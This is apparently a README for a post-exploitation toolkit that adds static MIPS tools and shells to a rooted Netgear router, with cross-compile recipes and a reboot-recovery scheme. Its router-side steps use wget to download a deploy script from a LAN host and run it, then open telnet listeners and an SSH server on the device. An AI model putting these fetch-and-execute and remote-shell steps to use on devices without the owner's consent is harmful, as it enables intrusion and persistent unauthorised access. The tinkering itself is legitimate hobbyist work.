# Netgear Router Post-Exploit Toolkit

Static mipsel binaries and scripts for enhancing a rooted Netgear router's shell environment.

## Target Environment

| Detail | Value |
|--------|-------|
| Architecture | MIPS little-endian (mipsel) |
| Kernel | Linux 2.6.22+ |
| libc | uClibc (static binaries preferred) |
| RAM | ~46 MB free |
| Storage | USB FAT32 (15 GB) at `/tmp/mnt/usb0/part1` |
| Internet | **None** — router is LAN-only |

## How It Works

```
 ┌──────────┐    GitHub     ┌──────────┐    LAN HTTP    ┌──────────┐
 │ Internet │ ◄──────────── │    Pi    │ ──────────────► │  Router  │
 └──────────┘  git clone    │ 172.16.  │  wget 2 files  │ 172.16.  │
                            │   0.3    │                │   0.1    │
                            └──────────┘                └──────────┘
```

1. **Pi** clones this repo from GitHub (has internet)
2. Pi runs `download-toolkit.sh` — downloads binaries, packs into `toolkit.tar.gz`
3. Pi serves `serve/` folder over HTTP on LAN
4. **Router** grabs 2 files: `busybox` (bootstrap) + `toolkit.tar.gz` (everything else)
5. BusyBox extracts the tarball → full toolkit installed
6. USB caching means re-deploys after reboot don't need the Pi

## Quick Start

### On the Pi (has internet):
```bash
# Clone the repo
git clone https://github.com/CHANGEME/netgearworking.git
cd netgearworking/toolkit

# Download binaries + pack toolkit.tar.gz
chmod +x download-toolkit.sh
./download-toolkit.sh

# Serve on port 8080 (serves from serve/ directory)
./download-toolkit.sh --serve 8080
```

### On the Router (after exploit gives you shell):
```sh
# Bootstrap: get busybox + extract toolkit (3 commands)
wget http://172.16.0.3:8080/busybox -O /tmp/busybox && chmod 755 /tmp/busybox
mkdir -p /tmp/bin && /tmp/busybox --install -s /tmp/bin && export PATH=/tmp/bin:$PATH
wget http://172.16.0.3:8080/toolkit.tar.gz -O /tmp/tk.tar.gz && tar xzf /tmp/tk.tar.gz -C /tmp/bin/ && rm /tmp/tk.tar.gz

# Or one-shot:
wget http://172.16.0.3:8080/_deploy.sh -O /tmp/d.sh && sh /tmp/d.sh 172.16.0.3 8080
```

Or if using v4 of the exploit script, it does this automatically.

## Toolkit Contents

### bin/ — Static MIPSEL Binaries

| Binary | Size | Description | Status |
|--------|------|-------------|--------|
| `busybox` | ~1.6 MB | BusyBox 1.31.0 — 396 applets (ash, wget, vi, awk, sed, find, nc, httpd...) | ✅ Verified |
| `micropython` | ~1 MB | MicroPython — Python 3 scripting on embedded | 🔲 Needs cross-compile |
| `dropbearmulti` | ~400 KB | Dropbear — SSH server + client + scp + key generation | 🔲 Needs cross-compile |
| `socat` | ~400 KB | socat — bidirectional data relay (tunnels, port forwarding) | 🔲 Needs cross-compile |
| `tcpdump` | ~1.2 MB | tcpdump — packet capture and analysis | 🔲 Needs cross-compile |
| `strace` | ~500 KB | strace — syscall tracer for debugging | 🔲 Needs cross-compile |

### scripts/ — Automation

| Script | Runs On | Description |
|--------|---------|-------------|
| `deploy.sh` | Router | Downloads + installs all tools from Pi HTTP server |

### configs/ — Configuration Files

Reserved for dropbear keys, profile scripts, etc.

## Cross-Compiling for MIPSEL

If a pre-built static binary isn't available, you can cross-compile on the Pi or any Linux box:

### Setup toolchain (Debian/Ubuntu):
```bash
sudo apt install gcc-mipsel-linux-gnu g++-mipsel-linux-gnu
```

### MicroPython:
```bash
git clone https://github.com/micropython/micropython.git
cd micropython/ports/unix
make CROSS_COMPILE=mipsel-linux-gnu- \
     CFLAGS_EXTRA="-static" \
     LDFLAGS_EXTRA="-static"
# Output: build-standard/micropython
```

### Dropbear SSH:
```bash
wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2024.86.tar.bz2
tar xf dropbear-2024.86.tar.bz2 && cd dropbear-2024.86
./configure --host=mipsel-linux-gnu --disable-zlib --enable-static \
    --enable-bundled-libtom CC=mipsel-linux-gnu-gcc
make PROGRAMS="dropbearmulti" STATIC=1
# Output: dropbearmulti
```

### socat:
```bash
wget http://www.dest-unreach.org/socat/download/socat-1.8.0.1.tar.gz
tar xf socat-*.tar.gz && cd socat-*
CC=mipsel-linux-gnu-gcc ./configure --host=mipsel-linux-gnu
make CFLAGS="-static" LDFLAGS="-static"
# Output: socat
```

### General static build pattern:
```bash
CC=mipsel-linux-gnu-gcc \
CFLAGS="-static -Os" \
LDFLAGS="-static" \
./configure --host=mipsel-linux-gnu --prefix=/tmp
make -j$(nproc)
mipsel-linux-gnu-strip <binary>  # shrink it
```

## After Deployment

### What you get:
```
Port 8888 — Basic telnet (stock /bin/sh)
Port 8889 — Enhanced shell (BusyBox ash, full PATH, TERM=xterm)
Port 2222 — SSH server (if dropbear installed)
```

### MicroPython usage:
```sh
# Interactive REPL
micropython

# Run a script
micropython -c "
import os
for f in os.listdir('/tmp'):
    print(f)
"

# One-liner HTTP request (no urllib on micropython unix port)
micropython -c "
import socket
s = socket.socket()
s.connect(('172.16.0.3', 8080))
s.send(b'GET / HTTP/1.0\r\nHost: x\r\n\r\n')
print(s.recv(4096))
s.close()
"
```

### SSH access (if dropbear installed):
```bash
# From Pi — proper SSH instead of telnet
ssh -p 2222 root@172.16.0.1
```

## Persistence

**Nothing persists across router reboots.** `/tmp` is RAM-backed.

The toolkit handles this with USB caching:
- First install: downloads from Pi, caches to USB (`/tmp/mnt/usb0/part1/toolkit/`)
- Subsequent installs: loads from USB cache (no Pi needed, much faster)
- Re-exploit + `deploy.sh` restores everything in seconds

## Adding New Tools

1. Cross-compile a static mipsel binary (see above)
2. Verify: `file your-binary` should show `ELF 32-bit LSB executable, MIPS, MIPS32`
3. Drop it in `bin/`
4. Add download URL to `download-toolkit.sh` BINARIES array
5. Add install step to `scripts/deploy.sh`
6. `git push` — v4 exploit will pick it up automatically
